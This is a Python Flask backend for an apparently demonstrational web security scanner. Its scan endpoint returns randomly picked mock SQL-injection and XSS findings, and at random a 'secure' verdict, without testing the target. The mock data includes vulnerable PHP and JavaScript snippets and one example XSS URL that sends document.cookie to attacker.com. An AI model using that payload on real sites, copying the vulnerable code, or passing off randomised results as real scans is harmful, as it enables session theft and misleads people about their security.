from flask import Flask, request, jsonify, render_template, send_from_directory
import os
import time
import json
import re
import random
from urllib.parse import urlparse

app = Flask(__name__, static_folder='.', static_url_path='')

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/api/scan', methods=['POST'])
def scan():
    """
    API endpoint to handle security scan requests
    """
    data = request.json
    
    if not data or 'url' not in data:
        return jsonify({
            'success': False,
            'error': 'Missing required parameters'
        }), 400
    
    target_url = data.get('url')
    scan_types = data.get('scanTypes', ['sqlInjection', 'xss'])
    scan_depth = data.get('scanDepth', 'quick')
    
    # Validate URL
    if not is_valid_url(target_url):
        return jsonify({
            'success': False,
            'error': 'Invalid URL format'
        }), 400
    
    # In a real implementation, we would perform actual security tests
    # For this demo, we'll simulate the scan process
    
    # Simulate processing time
    time.sleep(2)
    
    # Generate mock results
    results = generate_mock_results(target_url, scan_types, scan_depth)
    
    return jsonify({
        'success': True,
        'results': results
    })

@app.route('/api/export', methods=['POST'])
def export_results():
    """
    Export scan results in different formats
    """
    data = request.json
    
    if not data or 'results' not in data:
        return jsonify({
            'success': False,
            'error': 'Missing scan results'
        }), 400
    
    export_format = data.get('format', 'json')
    results = data.get('results')
    
    # In a real implementation, we would format and return the results
    # in the requested format (JSON, PDF, CSV, etc.)
    
    return jsonify({
        'success': True,
        'exportUrl': f'/exports/scan-{int(time.time())}.{export_format}'
    })

def is_valid_url(url):
    """
    Validate URL format
    """
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def generate_mock_results(url, scan_types, scan_depth):
    """
    Generate mock scan results for demonstration
    """
    vulnerabilities = []
    
    # Load mock vulnerability data
    with open('mock_vulnerabilities.json', 'r') as f:
        mock_data = json.load(f)
    
    # Determine number of vulnerabilities based on scan depth
    max_vulns = 5 if scan_depth == 'deep' else 2
    
    # Add SQL injection vulnerabilities if requested
    if 'sqlInjection' in scan_types:
        sql_vulns = mock_data.get('sqlInjection', [])
        # Select random subset
        selected = random.sample(sql_vulns, min(len(sql_vulns), max_vulns))
        vulnerabilities.extend(selected)
    
    # Add XSS vulnerabilities if requested
    if 'xss' in scan_types:
        xss_vulns = mock_data.get('xss', [])
        # Select random subset
        selected = random.sample(xss_vulns, min(len(xss_vulns), max_vulns))
        vulnerabilities.extend(selected)
    
    # Randomly decide if we want to return zero vulnerabilities (secure site)
    if random.random() > 0.7:
        vulnerabilities = []
    
    # Update vulnerability locations to match the target URL
    parsed_url = urlparse(url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    for vuln in vulnerabilities:
        vuln['location'] = f"{base_url}{vuln.get('location', '/')}"
    
    return {
        'scanDate': time.strftime('%Y-%m-%dT%H:%M:%SZ'),
        'target': url,
        'vulnerabilities': vulnerabilities,
        'scanDuration': random.randint(5, 30)  # Random scan duration in seconds
    }

if __name__ == '__main__':
    # Create mock_vulnerabilities.json if it doesn't exist
    if not os.path.exists('mock_vulnerabilities.json'):
        mock_data = {
            "sqlInjection": [
                {
                    "title": "SQL Injection in Login Form",
                    "severity": "Critical",
                    "location": "/login.php",
                    "description": "The login form is vulnerable to SQL injection attacks. User input is not properly sanitized before being used in SQL queries.",
                    "impact": "An attacker could bypass authentication, extract sensitive data, or execute arbitrary SQL commands on the database.",
                    "recommendation": "Use prepared statements or parameterized queries instead of directly incorporating user input into SQL queries. Implement input validation and sanitization.",
                    "code": "$username = $_POST['username'];\n$password = $_POST['password'];\n\n// Vulnerable code\n$query = \"SELECT * FROM users WHERE username='$username' AND password='$password'\";\n$result = mysqli_query($connection, $query);"
                },
                {
                    "title": "SQL Injection in Search Function",
                    "severity": "High",
                    "location": "/search.php",
                    "description": "The search function is vulnerable to SQL injection. User input from the search field is inserted directly into SQL queries.",
                    "impact": "Attackers could extract sensitive data, modify database contents, or potentially gain access to the underlying server.",
                    "recommendation": "Use prepared statements with parameterized queries. Apply proper input validation and consider using an ORM (Object-Relational Mapping) library.",
                    "code": "$searchTerm = $_GET['q'];\n\n// Vulnerable code\n$query = \"SELECT * FROM products WHERE name LIKE '%$searchTerm%' OR description LIKE '%$searchTerm%'\";\n$result = mysqli_query($connection, $query);"
                },
                {
                    "title": "Blind SQL Injection Vulnerability",
                    "severity": "Medium",
                    "location": "/profile.php",
                    "description": "The profile page is vulnerable to blind SQL injection attacks through the user ID parameter.",
                    "impact": "Even without direct error messages, attackers can extract data by observing differences in application responses.",
                    "recommendation": "Use parameterized queries and implement proper input validation. Consider using a Web Application Firewall (WAF) as an additional security layer.",
                    "code": "$userId = $_GET['id'];\n\n// Vulnerable code\n$query = \"SELECT * FROM user_profiles WHERE user_id = $userId\";\n$result = $db->query($query);"
                }
            ],
            "xss": [
                {
                    "title": "Stored XSS in Comment System",
                    "severity": "Critical",
                    "location": "/comments.php",
                    "description": "The comment system stores user input without proper sanitization, allowing attackers to inject malicious JavaScript.",
                    "impact": "Attackers can steal session cookies, redirect users to malicious sites, or perform actions on behalf of other users.",
                    "recommendation": "Sanitize user input before storing in the database. Use HTML encoding when displaying user-generated content. Consider using a Content Security Policy.",
                    "code": "// PHP code that stores comments\n$comment = $_POST['comment'];\n\n// Vulnerable code - directly storing user input\n$query = \"INSERT INTO comments (user_id, comment_text) VALUES ($userId, '$comment')\";\nmysqli_query($connection, $query);\n\n// JavaScript that displays comments\ndocument.getElementById('comments').innerHTML = data.commentHtml; // Insecure"
                },
                {
                    "title": "Reflected XSS in Error Messages",
                    "severity": "High",
                    "location": "/error.php",
                    "description": "Error messages reflect user input without proper encoding, allowing for XSS attacks via specifically crafted URLs.",
                    "impact": "Attackers can create malicious links that execute JavaScript in victims' browsers when clicked.",
                    "recommendation": "Encode all output that contains user input. Use a templating system that automatically escapes output.",
                    "code": "// Vulnerable code\nif (!isset($_GET['id'])) {\n  echo \"<div class='error'>Missing parameter: \" . $_GET['parameter'] . \"</div>\";\n}\n\n// Example attack URL:\n// error.php?parameter=<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>"
                },
                {
                    "title": "DOM-based XSS Vulnerability",
                    "severity": "Medium",
                    "location": "/js/main.js",
                    "description": "Client-side JavaScript code insecurely processes URL fragment identifiers, leading to DOM-based XSS.",
                    "impact": "Attackers can execute arbitrary JavaScript by crafting specific URLs with malicious fragments.",
                    "recommendation": "Use safe DOM manipulation methods and sanitize all data before inserting it into the DOM.",
                    "code": "// Vulnerable code\nconst value = window.location.hash.substring(1);\ndocument.getElementById('output').innerHTML = decodeURIComponent(value);\n\n// Safer alternative\ndocument.getElementById('output').textContent = decodeURIComponent(value);"
                }
            ]
        }
        
        with open('mock_vulnerabilities.json', 'w') as f:
            json.dump(mock_data, f, indent=2)
    
    # Start the Flask server
    app.run(debug=True, host='0.0.0.0', port=5001)